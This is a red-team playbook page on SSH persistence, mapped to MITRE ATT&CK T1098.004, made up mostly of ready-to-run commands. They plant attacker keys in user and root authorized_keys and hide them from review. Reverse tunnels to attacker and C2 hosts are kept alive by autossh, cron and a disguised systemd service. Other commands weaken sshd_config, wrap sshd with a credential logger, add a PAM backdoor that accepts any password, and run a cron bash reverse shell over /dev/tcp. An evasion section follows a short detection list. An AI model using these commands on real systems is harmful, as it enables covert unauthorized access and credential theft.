# SSH Backdoors & Tunneling

> **MITRE ATT&CK**: Persistence > T1098.004 - Account Manipulation: SSH Authorized Keys
> **Platforms**: Linux, macOS, Windows (OpenSSH)
> **Required Privileges**: User (authorized_keys), Root (SSHD config, PAM backdoors)
> **OPSEC Risk**: Low-Medium (SSH is expected traffic in most environments)

---

## Strategic Overview

SSH is the primary remote access protocol for Linux/Unix systems, and its presence in enterprise environments is universal. SSH-based persistence is highly effective because SSH traffic is encrypted, expected by network monitoring tools, and difficult to distinguish from legitimate administrative access. For a Red Team Lead, SSH offers multiple persistence vectors: authorized key injection provides instant passwordless access, SSH tunneling creates encrypted channels through firewalls, and SSHD configuration modifications can create hidden backdoor access. The strategic advantage is that SSH persistence blends perfectly with legitimate sysadmin activity. The risk profile depends on how well the target monitors authorized_keys changes and SSHD configuration modifications.

## Technical Deep-Dive

### Adding SSH Authorized Keys

```bash
# Generate attacker key pair (on attacker machine)
ssh-keygen -t ed25519 -f ~/.ssh/redteam_key -N "" -C "admin@internal"
# ed25519 is preferred (smaller, faster, no known weaknesses vs RSA)

# Add public key to target user's authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... admin@internal" >> /home/targetuser/.ssh/authorized_keys

# Set proper permissions (required for SSH to accept the key)
chmod 700 /home/targetuser/.ssh
chmod 600 /home/targetuser/.ssh/authorized_keys
chown -R targetuser:targetuser /home/targetuser/.ssh

# Add to root for maximum access
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... admin@internal" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Connect using the key
ssh -i ~/.ssh/redteam_key targetuser@target.com
```

### Stealthy Key Placement

```bash
# Hide key among existing entries (if multiple keys exist)
# Use a comment that matches existing key naming conventions
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... deploy@jenkins-prod" >> ~/.ssh/authorized_keys

# Restrict key to specific command (appears less suspicious)
echo 'command="/usr/bin/rsync --server --sender -logDtprze.iLsfxCIvu . /",no-pty,no-agent-forwarding ssh-ed25519 AAAAC3...' >> ~/.ssh/authorized_keys

# Use authorized_keys2 (alternative file, sometimes not monitored)
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI..." >> ~/.ssh/authorized_keys2

# Set immutable attribute to prevent removal (requires root)
chattr +i /home/targetuser/.ssh/authorized_keys
# Remove: chattr -i /home/targetuser/.ssh/authorized_keys
```

### SSH Tunneling for Persistent Access

```bash
# === Local Port Forwarding ===
# Access internal service (10.0.0.5:3389) via SSH tunnel
ssh -L 8888:10.0.0.5:3389 user@jumphost.com
# Now connect to localhost:8888 to reach 10.0.0.5:3389

# === Remote Port Forwarding (Reverse Tunnel) ===
# From compromised host, create tunnel back to attacker
ssh -R 4444:localhost:22 attacker@attacker-server.com
# Attacker connects: ssh -p 4444 user@localhost (on attacker server)

# === Dynamic Port Forwarding (SOCKS Proxy) ===
# Create SOCKS proxy through compromised host
ssh -D 9050 user@compromised.host.com
# Configure tools to use SOCKS5 proxy at localhost:9050
# proxychains, browser, or individual tool SOCKS settings

# === Persistent tunnel options ===
ssh -N -f -R 4444:localhost:22 attacker@attacker-server.com
# -N: no command execution
# -f: background the SSH process
# -R: reverse tunnel
```

### AutoSSH for Persistent Tunnels

```bash
# autossh automatically reconnects dropped SSH tunnels
# Install: apt install autossh

# Persistent reverse tunnel that auto-reconnects
autossh -M 0 -f -N -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" \
  -R 4444:localhost:22 -i /home/user/.ssh/redteam_key attacker@attacker-server.com

# Add to crontab for reboot persistence
(crontab -l 2>/dev/null; echo "@reboot autossh -M 0 -f -N -o 'ServerAliveInterval=30' -o 'ServerAliveCountMax=3' -R 4444:localhost:22 -i /home/user/.ssh/redteam_key attacker@c2.com") | crontab -

# Systemd service for autossh (more robust than crontab)
cat > /etc/systemd/system/ssh-tunnel.service << 'SERVICEEOF'
[Unit]
Description=SSH Tunnel Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/autossh -M 0 -N -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -R 4444:localhost:22 -i /root/.ssh/tunnel_key attacker@c2.example.com
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
SERVICEEOF
systemctl enable ssh-tunnel.service
systemctl start ssh-tunnel.service
```

### SSHD Configuration Backdoors

```bash
# Modify SSHD config for backdoor access (requires root)

# Allow root login
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Add a secondary SSHD listener on non-standard port
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 2222" >> /etc/ssh/sshd_config

# Allow password authentication (if disabled)
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Additional authorized keys file in hidden location
echo "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.hidden_keys/%u" >> /etc/ssh/sshd_config
mkdir -p /etc/ssh/.hidden_keys/root
echo "ssh-ed25519 AAAAC3..." > /etc/ssh/.hidden_keys/root
chmod 600 /etc/ssh/.hidden_keys/root

# Reload SSHD to apply changes
systemctl reload sshd
```

### SSH Wrapper Script Backdoor

```bash
# Replace SSH binary with wrapper that logs credentials and maintains backdoor
mv /usr/sbin/sshd /usr/sbin/sshd.orig

cat > /usr/sbin/sshd << 'WRAPPEREOF'
#!/bin/bash
# Log all SSH auth attempts to hidden file
strace -f -e trace=write -p $$ -o /tmp/.ssh_log 2>/dev/null &
/usr/sbin/sshd.orig "$@"
WRAPPEREOF

chmod 755 /usr/sbin/sshd
```

### PAM Backdoor

```bash
# Modify PAM to accept a master password for any account
# This requires modifying libpam or PAM configuration

# Method 1: Add PAM module that accepts hardcoded password
# Compile custom pam_backdoor.so module

# Method 2: Modify pam_unix.so (extremely risky, may break auth)
# Conceptual - patch the password comparison function

# Method 3: PAM configuration modification
# Add a permissive module before the real authentication
echo "auth sufficient pam_permit.so" > /tmp/pam_backdoor.conf
# Insert at top of /etc/pam.d/sshd (before existing auth lines)
# WARNING: This allows ANY password - extremely obvious if discovered
```

### Cron-Based SSH Reverse Shells

```bash
# Crontab reverse SSH shell (reconnects every 5 minutes)
(crontab -l 2>/dev/null; echo "*/5 * * * * ssh -N -f -R 4444:localhost:22 -i /home/user/.ssh/key attacker@c2.com 2>/dev/null") | crontab -

# Alternative: Bash reverse shell via SSH tunnel
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1' 2>/dev/null") | crontab -

# Hide crontab entry (use system crontab instead of user crontab)
echo "*/5 * * * * root ssh -N -f -o StrictHostKeyChecking=no -R 4444:localhost:22 -i /root/.ssh/key attacker@c2.com 2>/dev/null" >> /etc/crontab
```

### SSH on Windows (OpenSSH)

```powershell
# Windows 10+ includes OpenSSH client and server
# Add authorized key on Windows
Add-Content -Path "$env:USERPROFILE\.ssh\authorized_keys" -Value "ssh-ed25519 AAAAC3..."

# For administrator accounts, keys go to a different file
Add-Content -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Value "ssh-ed25519 AAAAC3..."

# Start SSH service on Windows
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
```

## Detection & Evasion

### Detection Mechanisms
- **File integrity monitoring**: Changes to authorized_keys, sshd_config
- **auditd rules**: Monitor writes to .ssh directories
- **SSH authentication logs**: /var/log/auth.log, /var/log/secure
- **Network monitoring**: SSH connections to unexpected external hosts
- **Process monitoring**: Unexpected sshd child processes or tunnels

### Evasion Techniques
- Use key comments matching existing convention (deploy@jenkins, ansible@mgmt)
- Place keys in authorized_keys2 or alternative AuthorizedKeysFile paths
- Use SSH over port 443 to blend with HTTPS traffic
- Tunnel through existing SSH jump hosts to avoid new connection alerts
- Timestamp authorized_keys file to match original modification time
- Use ed25519 keys (shorter, blend better in authorized_keys files)

### OPSEC Considerations
- Authorized_keys changes are the single most important artifact to manage
- FIM (File Integrity Monitoring) solutions often monitor .ssh directories
- SSH tunnels create persistent TCP connections that may be noticed
- SSHD configuration changes require service restart/reload, which is logged
- PAM modifications can break authentication if done incorrectly
- Always maintain ability to clean up: note exact keys and changes made

## Cross-References

- `04-persistence/scheduled-tasks.md` - Cron-based persistence for tunnel maintenance
- `09-lateral-movement/` - SSH-based lateral movement
- `11-command-and-control/` - SSH tunneling as C2 channel
- `04-persistence/cloud-persistence.md` - Cloud SSH key management

## References

- MITRE T1098.004: https://attack.mitre.org/techniques/T1098/004/
- SSH tunneling guide: https://www.ssh.com/academy/ssh/tunneling
- AutoSSH: https://www.harding.motd.ca/autossh/
- PAM backdoor research: https://www.offensive-security.com/metasploit-unleashed/persistent-backdoors/
- Linux persistence techniques: https://www.elastic.co/blog/linux-persistence-techniques
